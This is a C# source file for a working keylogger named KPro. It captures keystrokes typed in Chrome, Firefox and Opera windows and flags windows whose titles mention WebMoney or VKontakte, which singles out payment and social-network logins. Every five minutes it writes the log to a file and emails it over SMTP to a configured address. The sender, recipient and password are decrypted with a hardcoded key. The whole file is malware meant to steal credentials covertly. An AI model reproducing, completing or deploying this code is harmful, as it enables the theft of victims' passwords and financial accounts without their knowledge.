using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;

namespace KPro
{
    class KeyLogger
    {
        bool _isStop, _isInput;
        StringBuilder _logContent, _buff;
        MailInfo _mailInfo;

        public KeyLogger(MailInfo mailInfo)
        {
            _buff = new StringBuilder();
            _logContent = new StringBuilder();
            _mailInfo = mailInfo;
            _isInput = false;
        }

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        private static extern int GetForegroundWindow();
        [DllImport("user32.dll")]
        private static extern int GetWindowText(int hWnd, StringBuilder text, int count);
        [DllImport("user32.dll")]
        private static extern int GetActiveWindow();

        public void StartLogging()
        {
            _isStop = false;
            _buff = new StringBuilder();
            _logContent = new StringBuilder();
            _buff.Length = 256;

            string currName = "", prevName = "";

            while (!_isStop)
            {
                int handle = GetForegroundWindow();
                if (GetWindowText(handle, _buff, 256) > 0)
                {
                    string line = _buff.ToString().ToLower();
                    if (line.Contains("chrome") || line.Contains("mozilla") || line.Contains("opera"))
                    {
                        prevName = currName;
                        currName = line;
                        if (currName != prevName && _isInput)
                        {
                            if (currName.Contains("webmoney") || currName.Contains("вконтакте"))
                            {
                                _logContent.AppendLine(string.Format("</XX{0}XX/>", prevName));
                                _logContent.AppendLine(string.Format("<XX{0}XX>", currName));
                            }
                            else
                            {
                                _logContent.AppendLine(string.Format("</--{0}--/>", prevName));
                                _logContent.AppendLine(string.Format("<--{0}-->", currName));
                            }
                            _isInput = false;
                        }

                        for (int i = 0; i < 255; i++)
                        {
                            int state = GetAsyncKeyState(i);
                            if (state == 1 || state == -32767)
                            {
                                if ((Keys)i != Keys.LButton)
                                {
                                    if (i >= 65 && i <= 90)
                                    {
                                        _logContent.Append(((Keys)i).ToString() + ((i >= 65 && i <= 90) ? "" : "\n"));
                                        _isInput = true;
                                    }
                                    else if ((Keys)i == Keys.Space)
                                        _logContent.Append(" ");
                    
                                }
                            }
                        }

                    }
                }
                Thread.Sleep(100);
            }
        }

        public void StopLog()
        {
            _isStop = true;

        }

        public void StartSendingMail(int sendMessagePeriod = 300000, bool isDecrypt = false)
        {

            while (!_isStop)
            {
                Thread.Sleep(sendMessagePeriod);
                try
                {

                    if (_logContent.ToString() != "")
                    {
                        string smtpServerAddress, mailFrom, mailTo, password;

                        smtpServerAddress = _mailInfo.SmtpServerAddress;
                        mailFrom = _mailInfo.MailFrom;
                        mailTo = _mailInfo.MailTo;
                        password = _mailInfo.Password;

                        if (isDecrypt)
                        {
                            string k = "723111";
                            smtpServerAddress = Crypt.Decrypt(smtpServerAddress, k);
                            mailFrom = Crypt.Decrypt(mailFrom, k);
                            mailTo = Crypt.Decrypt(mailTo, k);
                            password = Crypt.Decrypt(password, k);
                        }

                        MailMessage mail = new MailMessage();
                        mail.From = new MailAddress(mailFrom);
                        mail.To.Add(new MailAddress(mailTo));

                        ContentToFile("ase.txt", _logContent.ToString());
                        mail.Attachments.Add(new Attachment("ase.txt"));

                        SmtpClient client = new SmtpClient();
                        client.Host = smtpServerAddress;
                        client.Port = 587;
                        client.EnableSsl = true;
                        client.Credentials = new NetworkCredential(mailFrom.Split('@')[0], password);
                        client.DeliveryMethod = SmtpDeliveryMethod.Network;
                        client.Send(mail);
                        mail.Dispose();
                        _logContent.Clear();
                    }
                }
                catch (Exception e)
                {
                    throw new Exception("Mail.Send: " + e.Message);
                }
            }

        }

        void ContentToFile(string fname, string content)
        {
            using (var sw = new StreamWriter(fname))
            {
                sw.WriteLine(content);
            }
        }
    }
}
